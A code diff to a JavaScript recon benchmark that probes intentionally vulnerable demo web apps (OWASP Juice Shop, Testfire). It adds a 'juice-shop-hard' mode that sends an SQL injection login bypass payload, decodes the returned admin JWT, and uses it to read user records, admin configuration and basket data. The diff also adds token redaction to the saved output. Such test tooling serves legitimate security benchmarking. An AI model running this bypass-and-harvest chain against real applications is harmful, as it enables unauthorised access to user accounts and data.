@@ -11,7 +11,7 @@ const sampleBytes = Number(process.env.RECON_SAMPLE_BYTES || 20000);
 const userAgent = process.env.RECON_USER_AGENT || 'Mozilla/5.0 Pi-RECON-public-webapp-benchmark';
 
 if (!target || target === '--help' || target === '-h') {
-  console.log(`Pi-RECON public webapp live benchmark\n\nUsage:\n  node bench/recon-remote/public-webapp/run.mjs <url> [auto|juice-shop|testfire|generic]\n\nExamples:\n  node bench/recon-remote/public-webapp/run.mjs https://preview.owasp-juice.shop juice-shop\n  node bench/recon-remote/public-webapp/run.mjs https://demo.testfire.net testfire\n\nEnvironment:\n  RECON_TIMEOUT_MS=15000\n  RECON_MAX_BODY_BYTES=300000\n  RECON_USER_AGENT=<ua>\n\nOutput:\n  .pi/evidence/remote/public-webapp/<host>/<timestamp>/\n`);
+  console.log(`Pi-RECON public webapp live benchmark\n\nUsage:\n  node bench/recon-remote/public-webapp/run.mjs <url> [auto|juice-shop|juice-shop-hard|testfire|generic]\n\nExamples:\n  node bench/recon-remote/public-webapp/run.mjs https://preview.owasp-juice.shop juice-shop\n  node bench/recon-remote/public-webapp/run.mjs https://preview.owasp-juice.shop juice-shop-hard\n  node bench/recon-remote/public-webapp/run.mjs https://demo.testfire.net testfire\n\nEnvironment:\n  RECON_TIMEOUT_MS=15000\n  RECON_MAX_BODY_BYTES=300000\n  RECON_SAMPLE_BYTES=20000\n  RECON_USER_AGENT=<ua>\n\nOutput:\n  .pi/evidence/remote/public-webapp/<host>/<timestamp>/\n`);
   process.exit(target ? 0 : 2);
 }
 
@@ -40,6 +40,14 @@ function resolveProfile(url) {
   if (host.includes('juice')) return 'juice-shop';
   if (host.includes('testfire')) return 'testfire';
   return 'generic';
+}
+
+function redactBody(text) {
+  return String(text || '')
+    .replace(/eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/g, '<redacted.jwt>')
+    .replace(/(\"token\"\s*:\s*\")([^\"]+)(\")/gi, '$1<redacted>$3')
+    .replace(/(msToken=)[^&\"'\s]+/gi, '$1<redacted>')
+    .replace(/(a_bogus=)[^&\"'\s]+/gi, '$1<redacted>');
 }
 
 function requestHeaders(extra = {}) {
@@ -83,7 +91,8 @@ async function request(baseUrl, probe) {
       elapsedMs: Date.now() - started,
       bytes: buf.length,
       bodySha256: sha256(buf).slice(0, 24),
-      bodyHead: body.slice(0, sampleBytes),
+      rawBody: body,
+      bodyHead: redactBody(body.slice(0, sampleBytes)),
       error: null,
     };
   } catch (error) {
@@ -125,7 +134,7 @@ function securityHeaderFindings(response) {
 }
 
 function buildProbes(profile) {
-  if (profile === 'juice-shop') {
+  if (profile === 'juice-shop' || profile === 'juice-shop-hard') {
     return [
       { label: 'home', path: '/' },
       { label: 'version-api', path: '/rest/admin/application-version', headers: { accept: 'application/json,*/*' } },
@@ -133,6 +142,13 @@ function buildProbes(profile) {
       { label: 'challenge-api', path: '/api/Challenges', headers: { accept: 'application/json,*/*' } },
       { label: 'ftp-index', path: '/ftp/' },
       { label: 'ftp-confidential-acquisitions', path: '/ftp/acquisitions.md', headers: { accept: 'text/markdown,text/plain,*/*' } },
+      ...(profile === 'juice-shop-hard' ? [{
+        label: 'juice-sqli-login-bypass',
+        path: '/rest/user/login',
+        method: 'POST',
+        headers: { 'content-type': 'application/json', accept: 'application/json,*/*' },
+        body: JSON.stringify({ email: "' or 1=1--", password: 'x' }),
+      }] : []),
     ];
   }
   if (profile === 'testfire') {
@@ -160,6 +176,43 @@ function buildProbes(profile) {
   ];
 }
 
+function decodeJwtPayload(token) {
+  try {
+    const payload = String(token || '').split('.')[1];
+    if (!payload) return null;
+    return JSON.parse(Buffer.from(payload.replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString('utf8'));
+  } catch {
+    return null;
+  }
+}
+
+function parseJsonBody(probe) {
+  try {
+    return JSON.parse(probe?.rawBody || probe?.bodyHead || '{}');
+  } catch {
+    return null;
+  }
+}
+
+async function runDependentProbes(profile, baseUrl, probes) {
+  if (profile !== 'juice-shop-hard') return [];
+  const login = probes.find((probe) => probe.label === 'juice-sqli-login-bypass');
+  const parsed = parseJsonBody(login);
+  const auth = parsed?.authentication || {};
+  const token = auth.token;
+  if (!token) return [];
+  const authHeaders = { authorization: `Bearer ${token}`, accept: 'application/json,*/*' };
+  const dependent = [
+    { label: 'auth-api-users', path: '/api/Users', headers: authHeaders },
+    { label: 'auth-admin-config', path: '/rest/admin/application-configuration', headers: authHeaders },
+    { label: 'auth-basket', path: `/rest/basket/${auth.bid || 1}`, headers: authHeaders },
+    { label: 'auth-basket-items', path: '/api/BasketItems', headers: authHeaders },
+  ];
+  const out = [];
+  for (const probe of dependent) out.push(await request(baseUrl, probe));
+  return out;
+}
+
 function analyze(profile, baseUrl, probes) {
   const byLabel = Object.fromEntries(probes.map((p) => [p.label, p]));
   const findings = [];
@@ -167,7 +220,7 @@ function analyze(profile, baseUrl, probes) {
   if (home) {
     for (const missing of securityHeaderFindings(home)) findings.push({ id: missing, severity: 'info', evidence: 'home response header absent' });
   }
-  if (profile === 'juice-shop') {
+  if (profile === 'juice-shop' || profile === 'juice-shop-hard') {
     const products = byLabel['products-api'];
     const challenges = byLabel['challenge-api'];
     const ftpConf = byLabel['ftp-confidential-acquisitions'];
@@ -176,6 +229,21 @@ function analyze(profile, baseUrl, probes) {
     if (products?.status === 200 && /"status"\s*:\s*"success"/.test(products.bodyHead || '')) findings.push({ id: 'product_search_api_reachable', severity: 'info', evidence: '/rest/products/search?q= returned success JSON' });
     if (challenges?.status === 200 && /"category"|"description"|"key"/.test(challenges.bodyHead || '')) findings.push({ id: 'challenge_inventory_reachable', severity: 'low', evidence: '/api/Challenges returned challenge metadata' });
     if (ftpConf?.status === 200 && /confidential|acquisitions/i.test(ftpConf.bodyHead || '')) findings.push({ id: 'confidential_ftp_document_exposed', severity: 'medium', evidence: '/ftp/acquisitions.md returned confidential acquisition text' });
+    if (profile === 'juice-shop-hard') {
+      const login = byLabel['juice-sqli-login-bypass'];
+      const parsed = parseJsonBody(login);
+      const auth = parsed?.authentication || {};
+      const jwt = decodeJwtPayload(auth.token);
+      if (login?.status === 200 && auth.token && jwt?.data?.role === 'admin') findings.push({ id: 'juice_sqli_login_bypass_admin_jwt', severity: 'critical', evidence: "POST /rest/user/login with email=' or 1=1-- returned JWT with role=admin" });
+      const users = byLabel['auth-api-users'];
+      const config = byLabel['auth-admin-config'];
+      const basket = byLabel['auth-basket'];
+      const items = byLabel['auth-basket-items'];
+      if (users?.status === 200 && /\"email\"|\"role\"|\"data\"/.test(users.rawBody || users.bodyHead || '')) findings.push({ id: 'admin_users_api_reachable_with_bypass_token', severity: 'high', evidence: '/api/Users returned user records using bypass JWT' });
+      if (config?.status === 200 && /application|server|config/i.test(config.rawBody || config.bodyHead || '')) findings.push({ id: 'admin_config_api_reachable_with_bypass_token', severity: 'high', evidence: '/rest/admin/application-configuration returned config using bypass JWT' });
+      if (basket?.status === 200 && /Basket|Products|UserId/i.test(basket.rawBody || basket.bodyHead || '')) findings.push({ id: 'authenticated_basket_read_confirmed', severity: 'medium', evidence: '/rest/basket/<bid> returned authenticated basket data' });
+      if (items?.status === 200 && /ProductId|BasketId|quantity/i.test(items.rawBody || items.bodyHead || '')) findings.push({ id: 'basket_items_api_reachable_with_bypass_token', severity: 'medium', evidence: '/api/BasketItems returned basket item data using bypass JWT' });
+    }
   }
   if (profile === 'testfire') {
     const xss = byLabel['reflected-xss-probe'];
@@ -206,6 +274,7 @@ const started = Date.now();
 const probeDefs = buildProbes(profile);
 const probes = [];
 for (const probe of probeDefs) probes.push(await request(baseUrl, probe));
+probes.push(...await runDependentProbes(profile, baseUrl, probes));
 const analysis = analyze(profile, baseUrl.toString(), probes);
 
 const result = {
@@ -214,9 +283,9 @@ const result = {
   verdict: analysis.verdict,
   elapsedMs: Date.now() - started,
   findings: analysis.findings,
-  probes: probes.map((probe) => ({
+  probes: probes.map(({ rawBody, ...probe }) => ({
     ...probe,
-    bodyHead: probe.bodyHead ? probe.bodyHead.slice(0, 3000) : probe.bodyHead,
+    bodyHead: probe.bodyHead ? redactBody(probe.bodyHead).slice(0, 3000) : probe.bodyHead,
   })),
   routeHints: analysis.routeHints,
   links: analysis.links,
